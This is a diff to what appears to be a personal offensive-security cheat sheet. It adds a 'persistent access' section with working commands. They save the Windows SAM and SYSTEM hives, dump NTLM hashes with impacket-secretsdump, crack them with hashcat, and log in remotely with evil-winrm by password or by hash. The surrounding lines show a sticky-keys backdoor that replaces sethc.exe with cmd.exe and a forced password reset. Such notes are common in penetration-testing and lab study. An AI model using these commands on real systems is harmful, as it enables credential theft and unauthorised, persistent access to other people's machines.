@@ -18,6 +18,18 @@ cp /mnt/Windows/system32/cmd.exe /mnt/Windows/System32/sethc.exe
 net user user new_password
 ```
 
+### Crack password (persistent access)
+
+```bash
+reg save HKLM\sam ./sam.save
+reg save HKLM\system ./system.save
+impacket-secretsdump -sam sam.save -system system.save LOCAL #paste dump hashes in hashes.txt
+
+hashcat -m 1000 hashes.txt wordlist.txt
+evil-winrm -i <ip> -u <user> -p <passwd>
+evil-winrm -i <ip> -u <user> -H <hash>
+```
+
 ### Malware
 
 https://www.youtube.com/watch?v=aNEqC-U5tHM&t=1470s&ab_channel=crow
